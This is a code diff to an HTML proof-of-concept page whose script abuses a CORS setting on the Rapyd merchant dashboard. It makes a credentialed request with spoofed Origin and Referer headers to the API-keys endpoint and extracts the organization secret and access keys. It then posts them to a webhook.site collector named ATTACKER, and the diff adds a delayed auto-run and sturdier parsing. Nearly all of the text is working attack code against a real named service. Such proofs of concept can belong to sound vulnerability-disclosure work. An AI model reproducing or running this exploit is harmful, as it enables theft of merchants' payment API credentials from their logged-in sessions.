@@ -11,20 +11,22 @@
 
   <script>
     const TARGET = "https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys";
-    const ATTACKER = "https://webhook.site/257b5906-77de-4391-a468-beaa821222c7"; // REPLACE WITH NEW WEBHOOK URL
+    const ATTACKER = "https://webhook.site/b19460f5-42ca-46ce-8d18-ac1b1c0cfbc1"; // Get new URL from webhook.site
     const status = document.getElementById('status');
 
     async function steal() {
       try {
         status.innerHTML = "1. Sending request to Rapyd...";
 
-        const response = await fetch("rapyd", {
+        const response = await fetch(TARGET, {
           method: 'GET',
-          credentials: 'include',
+          credentials: 'include', // Sends session cookies
           headers: {
-            'Accept': 'application/json',
+            'Accept': 'application/json, text/plain, */*',
             'X-Requested-With': 'XMLHttpRequest',
-            'Origin': 'https://shadowarpit.github.io' // LOWERCASE
+            'Origin': 'null', // Test null origin (common bypass)
+            'User-Agent': navigator.userAgent,
+            'Referer': 'https://dashboard.rapyd.net/' // Mimic dashboard
           }
         });
 
@@ -35,40 +37,55 @@
         const corsCredentials = response.headers.get('access-control-allow-credentials');
         console.log("CORS Headers:", { corsOrigin, corsCredentials });
 
-        if (!response.ok) {
-          const text = await response.text();
-          throw new Error(`HTTP ${response.status}: ${text.substring(0, 100)}`);
+        let data, isJson = false;
+        const rawText = await response.text();
+        console.log("Raw Response:", rawText);
+
+        try {
+          data = JSON.parse(rawText);
+          isJson = true;
+        } catch {
+          data = rawText; // Fallback to text if not JSON
         }
 
-        const data = await response.json();
-        const secret = data.data?.organization_secret_key;
-        const access = data.data?.organization_access_key;
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status}: ${rawText.substring(0, 100)}...`);
+        }
 
-        if (!secret || !access) throw new Error("Secret key not found in response");
+        // Extract keys (adjust based on actual response structure)
+        const secret = isJson ? (data.data?.organization_secret_key || data.secret_key) : 'not-found';
+        const access = isJson ? (data.data?.organization_access_key || data.access_key) : 'not-found';
+
+        if (!secret || !access || secret === 'not-found') {
+          throw new Error("Keys not found in response. Button click needed?");
+        }
 
         status.innerHTML = "3. SECRET STOLEN! Sending to webhook...";
+        console.log("STOLEN:", { access, secret });
 
-        await fetch("https://webhook.site/257b5906-77de-4391-a468-beaa821222c7", {
+        // Exfil to webhook
+        const exfil = await fetch(ATTACKER, {
           method: 'POST',
-          mode: 'no-cors',
+          mode: 'no-cors', // Fire-and-forget
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             access_key: access,
             secret_key: secret,
+            raw_response: rawText.substring(0, 500), // Truncate for size
             poc_url: window.location.href,
             timestamp: new Date().toISOString()
           })
         });
 
         status.innerHTML = "SUCCESS! Check webhook.site";
-        console.log("STOLEN:", { access, secret });
       } catch (e) {
         status.innerHTML = "ERROR: " + e.message;
         console.error("Exploit error:", e);
       }
     }
 
-    steal();
+    // Delay to ensure dashboard session is active
+    setTimeout(steal, 1000);
   </script>
 </body>
 </html>
